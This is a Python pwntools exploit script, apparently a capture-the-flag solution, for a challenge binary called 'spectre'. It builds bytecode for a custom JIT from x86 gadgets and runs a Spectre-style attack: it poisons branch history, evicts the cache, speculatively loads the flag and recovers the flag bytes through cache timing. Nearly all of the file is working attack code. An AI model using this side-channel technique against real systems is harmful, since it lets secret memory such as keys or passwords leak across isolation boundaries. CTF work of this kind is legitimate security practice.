from pwn import *
import sys, os
import random

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "spectre"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process([bin_name, "./flag"]) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def menu (idx):
  r.recvuntil ("> ")
  r.sendline (str(idx))

context.os='linux'
context.arch='amd64'

SRC = {}
SRC['r8'] = 0 << 3
SRC['r9'] = 1 << 3
SRC['r10'] = 2 << 3
SRC['r11'] = 3 << 3
SRC['r12'] = 4 << 3
SRC['r13'] = 5 << 3
SRC['r14'] = 6 << 3
SRC['r15'] = 7 << 3

DST = {}
DST['r8'] = 0
DST['r9'] = 1
DST['r10'] = 2
DST['r11'] = 3
DST['r12'] = 4
DST['r13'] = 5
DST['r14'] = 6
DST['r15'] = 7

PRINT_ASM = False
tt = ""
def print_disasm (asm):
  global tt
  if PRINT_ASM is False:
    tt += asm
    return
  print disasm (asm, os='linux', arch='amd64')

def cdq (reg):
  gadget = "\x4d\x63"+chr(0xc0|(reg&7)*8 | (reg>>3)&7) 
  print_disasm (gadget)
  ac = "\x01" + chr(reg)
  return ac

def add (reg):
  gadget = "\x4d\x01"+chr(0xc0|reg) 
  print_disasm (gadget)
  ac = "\x02" + chr(reg)
  return ac

def sub (reg):
  gadget = "\x4d\x29"+chr(0xc0|reg) 
  print_disasm (gadget)
  ac = "\x03" + chr(reg)
  return ac

def andd (reg):
  gadget = "\x4d\x21"+chr(0xc0|reg) 
  print_disasm (gadget)
  ac = "\x04" + chr(reg)
  return ac

def shl (reg):
  gadget = "\x44\x88"+chr(0xc1|reg&0x38) +"\x49\xd3" + chr (reg&7 | 0xe0) 
  print_disasm (gadget)
  ac = "\x05" + chr(reg)
  return ac

def shr (reg):
  gadget = "\x44\x88"+chr(0xc1|reg&0x38) +"\x49\xd3" + chr (reg&7 | 0xe8) 
  print_disasm (gadget)
  ac = "\x06" + chr(reg)
  return ac

def mov (reg):
  gadget = "\x4d\x89"+chr(0xc0|reg) 
  print_disasm (gadget)
  ac = "\x07" + chr(reg)
  return ac

def movc (reg, c):
  rr = reg&7
  if rr >0xf :
    rr -= 0x10
    gadget = "\x48\xc7" + chr(rr|0xc0) + p32(c)
  else :
    gadget = "\x49\xc7" + chr(rr|0xc0) + p32(c)

  print_disasm (gadget)
  ac = "\x08" + chr(reg) + p32(c)
  return ac

def load (reg):
  rr = (reg>>3) & 7
  if (rr > 8):
    sys.exit ("load reg error")
  gadget = "\x44\x89" +  chr ((rr * 8) | 0xc0)
  gadget += "\x4c\x8b" + chr(8*(reg&7)+4) + "\x07"

  print_disasm (gadget)
  ac = "\x09" + chr(reg)
  return ac

def store (reg):
  rr = (reg) & 7
  if (rr > 8):
    sys.exit ("store reg error")
  gadget = "\x44\x89" +  chr ((rr * 8) | 0xc0)
  gadget += "\x4c\x89" + chr((reg&0x38)|4) + "\x07"

  print_disasm (gadget)
  ac = "\x0a" + chr(reg)
  return ac

def builtin (reg):
  rr = ((reg>>3) & 7)
  if (rr > 1):
    sys.exit ("builtin reg error")
  gadget = "\x57\x56" 
  for i in xrange (4):
    gadget += "\x41" + chr (i | 0x50)
  gadget += "8944CE8944C78944".decode('hex')[::-1]
  gadget += "D98944D2".decode('hex')[::-1]
  gadget += "\xff\x55"
  gadget += chr(rr*8)
  for i in xrange (3, -1, -1):
    gadget += "\x41" + chr (i | 0x58)
  gadget += "89495f5e".decode('hex')[::-1]
  gadget +=  chr(reg&7|0xc0)

  print_disasm (gadget)
  ac = "\x0b" + chr(reg)
  return ac

def loop (reg, c, _code):
  rr = ((reg>>3) & 7)

  cc = c
  if (c < 0):
    cc = 0x100000000 + c

  code = _code
  if (_code < 0):
    code = 0x100000000 + _code
  
  gadget = "\x48\xc7" + chr(0xc0) + p32(cc)
  gadget += "\x49\x39" + chr (rr | 0xc0)
  gadget += "\x0f\x8e"
  gadget += p32 (0x100000000-0x10 - _code)  # this is not correct in disasm view, but working on binary 

  print_disasm (gadget)
  ac = "\x0c" + chr(reg) + p32(c) + p32 (code)
  return ac

"""
// static value
int flush_size = 64;


// make our test area have dirty bit
void * temp = 0x0;
for (int j = 0; j < 0x100000/flush_size; j++)
data[temp + j] = 0xffffffff;

// branch history (pAp) poisoning 
builtin_bc (0x1000 - 4); // jbe instruction will not jump
// repeat 50 times

// flush by reverse order
for (int i = 0; i < 10; i++) 
{
  void * temp = 0x2000000;
  for (int j = 0; j < 0x1f00000 / flush_size; j++)
    r8 = data[temp - j];
}

// delay fence
for (int i = 0; i < 0x100; i++);

// branch history (global) poisoning
for (int i = 0; i < -1 ; i++); /* jle instruction will not jump */
// repeat 256 times

builtin_time (); // access flag into cache

// go to branch speculation
/* use (idx * 0x1000) as array index; */
r15 = 56, r12 = 56-offset;
r8 = data[(builtin_bc(0x1018) << r15) >> r12];

// cache timing attack 
"""

pay = ""

offset = 12
flush_size = 0x40

#loop start
pay += movc (DST['r10'], 0x000000)
jmp_target1 = len(pay)

pay += movc (0, 0xffffffff) 
pay += store (DST['r10'])
#pay += load (SRC['r10'])
pay += movc (0, 4)
pay += add (DST['r10'])
pay += loop (SRC['r10'], 0x100000 , jmp_target1) # cmp r11, iter_max
#loop end


# branch history poisoning (per address)
pay2 = ""
pay2 += movc (2, 0x0)
pay2 += movc (3, offset)
pay2 += movc (0, 0x1000-4)
pay2 += builtin (0) # return to r8
pay += pay2*50

# cache eviction
pay += movc (DST['r13'], 0x0)
jmp_target4 = len(pay)

#loop start
pay += movc (DST['r11'], 0)
pay += movc (DST['r10'], 0x00000)
jmp_target1 = len(pay)

pay += movc (DST['r12'], 0x2000000 - 10 )
pay += movc (0, 0x0) 
pay += sub (DST['r12'] | SRC['r10'])
pay += load (SRC['r12'])
pay += movc (0, flush_size)
pay += add (DST['r10'])
pay += movc (DST['r8'], 1)
pay += add (DST['r11'])
pay += loop (SRC['r11'], 0x1f00000 / flush_size - 1, jmp_target1) # cmp r11, iter_max
#loop end

pay += movc(DST['r8'], 1)
pay += add (DST['r13'] | SRC['r8'])
pay += loop (SRC['r13'], 0x100, jmp_target4) # cmp r13, iter_max

# branch history poisoning (global)
# jle -> not taken
pay += loop (SRC['r8'],0xffffffff, jmp_target1) *256


pay += builtin (8) #exploit works w/o this line

# access to flag 
FLAG_OFFSET = 0

pay += movc (DST['r11'], 56)
pay += movc (DST['r12'], 56 - offset)
pay += movc (DST['r8'], 0x1020-8 + FLAG_OFFSET)
pay += builtin (DST['r14'])
pay += shl (DST['r14'] | SRC['r11']) 
pay += shr (DST['r14'] | SRC['r12'])
pay += load (SRC['r14'] | DST['r8']) #  r8 = data[r14]


# check
pay += movc (3, 0)
#pay += movc (DST['r10'], 0x100000)
pay += movc (DST['r10'], 0x0)

jmp_targetF = len(pay)
pay += movc (0, 0x0) 
pay += builtin (9) # return to r9
pay += load (SRC['r10'])
pay += builtin (8) # return to r8
pay += sub (DST['r8'] | SRC['r9'])
pay += movc(DST['r9'],3)
pay += shl(DST['r11'] | SRC['r9'])

#pay += movc (DST['r12'], 0x800)
pay += movc (DST['r12'], 0x0)
#pay += sub (DST['r12'] | SRC['r11'])
pay += add (DST['r12'] | SRC['r11'])

pay += load (DST['r9'] | SRC['r12'])
pay += andd (DST['r8'] | SRC['r9'])
pay += store (DST['r12'] | SRC['r8'])
pay += movc(DST['r9'],3)
pay += shr(DST['r11'] | SRC['r9'])
pay += movc (0, 1 << offset) 

#pay += sub (DST['r10'])
pay += add (DST['r10'])

pay += movc (0, 1)
pay += add (DST['r11'])
pay += loop (SRC['r11'], 0x100, jmp_targetF) # cmp r11, iter_max

print "rlength:",  (hex(len(pay)))
pay = pay.ljust (0x1000-6, "\x00")
pay += movc (0, 0x50505050)


#print disasm (tt)

with open ("bytecode", "wb") as f:
  f.write (p64(len(pay)) + pay + "\n")
do_debug ()
r.send (p64(len(pay)))
print "length:",  (hex(len(pay)))
r.sendline (pay + "a"*0x1f)
#print r.recv(0x100)

for i in range (0x00, 0x100):
  print hex(i),u64(r.recv(8)),

  if (i%0x10 == 0):
    print ""

r.close ()
#print r.recv(200)
#r.interactive ()

